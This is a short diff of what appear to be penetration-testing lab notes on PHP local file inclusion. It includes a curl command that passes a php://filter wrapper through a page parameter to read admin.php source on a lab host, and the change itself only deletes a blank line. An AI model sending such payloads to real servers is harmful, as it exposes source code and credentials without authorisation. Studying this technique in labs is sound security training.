@@ -9,7 +9,6 @@ the php://filter wrapper allows us to view .php files instead of executing them 
 ```
 curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
 ```
-
 #### Base64
 
 ```
